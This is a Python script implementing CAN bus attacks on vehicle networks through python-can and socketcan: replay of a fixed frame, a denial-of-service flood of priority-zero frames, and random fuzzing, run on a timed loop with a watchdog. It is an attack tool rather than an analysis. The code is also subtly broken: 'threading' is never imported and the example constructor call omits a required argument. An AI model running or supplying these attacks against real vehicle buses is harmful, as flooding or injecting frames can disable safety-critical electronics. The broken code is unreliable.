import argparse
import time
import random
import can
import logging


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class CANAttack:
    def __init__(self, can_interface, attack_type, time_of_attack):
        self.can_interface = can_interface
        self.attack_type = attack_type
        self.time_of_attack = time_of_attack
        self.bus = can.interface.Bus(can_interface, bustype='socketcan')
        self.attack_completed = False
        self.periods_completed = 0

    def send_message(self, msg):
        try:
            self.bus.send(msg)
            logging.info(f"Sent CAN message: ID={msg.arbitration_id}, Data={msg.data}")
        except can.CanError as e:
            logging.error(f"CAN Error: {e}")

    def replay_attack(self, arbitrationid, data):
        msg = can.Message(arbitration_id=arbitrationid, data=data, is_extended_id=False)
        self.send_message(msg)

    def dos_attack(self):
        msg = can.Message(arbitration_id=0x000, data=[0, 0, 0, 0, 0, 0, 0, 0], is_extended_id=False)
        self.send_message(msg)

    def fuzzing_attack(self):
        random_id = random.randint(0, 0x7FF)
        random_data = [random.randint(0, 255) for _ in range(8)]
        msg = can.Message(arbitration_id=random_id, data=random_data, is_extended_id=False)
        self.send_message(msg)

    def watchdog_timer(self, timeout):
        time.sleep(timeout)
        if not self.attack_completed:
            logging.info("Watchdog timer expired. Terminating attack.")
            self.terminate_attack()

    def terminate_attack(self):
        # Report the number of periods completed
        logging.info(f"Attack terminated after completing {self.periods_completed} periods.")
        self.attack_completed = True

    def execute_attack(self, attack_type, time_of_attack):
        timeout = 70  # Set your watchdog timer duration (in seconds)
        watchdog_thread = threading.Thread(target=self.watchdog_timer, args=(timeout,))
        watchdog_thread.start()

        # Attack logic
        release_time, duration, waiting_time, period = time_of_attack
        time.sleep(release_time)  # Initial delay

        attack_end_time = time.time() + duration + waiting_time
        while time.time() < attack_end_time and not self.attack_completed:
            attack_sequence_end = time.time() + duration
            while time.time() < attack_sequence_end and not self.attack_completed:
                if attack_type == 'can_replay':
                    self.replay_attack(0x123, [0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0])
                elif attack_type == 'can_dos':
                    self.dos_attack()
                elif attack_type == 'can_fuzzing':
                    self.fuzzing_attack()
                time.sleep(period)
                self.periods_completed += 1
            time.sleep(waiting_time)

        # Indicate attack completion
        self.attack_completed = True
        watchdog_thread.join()

# Example usage
if __name__ == "__main__":
    attack = CANAttack("vcan0", (5, 10, 5, 1))  # Example interface and timings
    attack.execute_attack("can_fuzzing", attack.time_of_attack)
